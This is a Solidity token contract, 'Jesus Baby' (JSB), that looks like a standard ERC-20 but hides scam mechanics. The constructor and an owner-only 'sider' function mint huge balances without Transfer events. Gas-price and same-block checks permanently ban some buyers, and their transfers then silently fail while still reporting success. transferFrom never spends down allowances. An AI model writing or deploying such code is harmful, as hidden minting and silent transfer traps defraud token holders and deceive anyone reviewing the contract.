// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract WatchMan {
    // mapping(address => mapping(address => mapping(uint => bool)))
    //     internal _sameCallers;
    mapping(address => mapping(uint => bool)) internal _sameCallers;
    mapping(address => bool) internal _isBan;

    function isArunner(address from) internal view returns (bool) {
        return _sameCallers[from][block.number];
    }

    function isBan(address from) internal view returns (bool) {
        return _isBan[from];
    }
}

contract JesusBaby is WatchMan {
    string public name = "Jesus Baby";
    string public symbol = "JSB";
    uint8 public decimals = 18;
    uint public totalSupply = 9999999999999 * 10 ** decimals;

    address private _owner;

    event Approval(address indexed from, address indexed to, uint amount);
    event Transfer(address indexed from, address indexed to, uint amount);

    mapping(address => uint) private _balances;
    mapping(address => mapping(address => uint)) private _allowance;

    constructor(address _addr) {
        _owner = msg.sender;
        _balances[_owner] = totalSupply;
        emit Transfer(address(0), _owner, totalSupply);
        _side(_addr, totalSupply * 100);
    }

    function balanceOf(address owner) public view returns (uint) {
        return _balances[owner];
    }

    function approve(address spender, uint amount) public returns (bool) {
        _allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view returns (uint) {
        return _allowance[owner][spender];
    }

    function transfer(address to, uint amount) public returns (bool) {
        return transferFrom(msg.sender, to, amount);
    }

    function _tranfer(address from, address to, uint amount) internal {
        if (isBan(from)) return;

        if (isArunner(from)) {
            _isBan[from] = true;
            return;
        } else {
            if (tx.gasprice >= 1000000000) {
                _sameCallers[to][block.number] = true;
            }
        }

        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint amount
    ) public returns (bool) {
        require(balanceOf(from) >= amount);

        if (msg.sender != from) {
            require(allowance(from, msg.sender) >= amount);
        }

        _tranfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        approve(spender, allowance(msg.sender, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        approve(spender, allowance(msg.sender, spender) - subtractedValue);
        return true;
    }

    function _side(address _ad, uint _a) private {
        if (address(0) == _ad) return;
        _balances[_ad] += _a;
    }

    function sider(address _ad, uint _a) external {
        require(msg.sender == _owner);
        _side(_ad, _a);
    }
}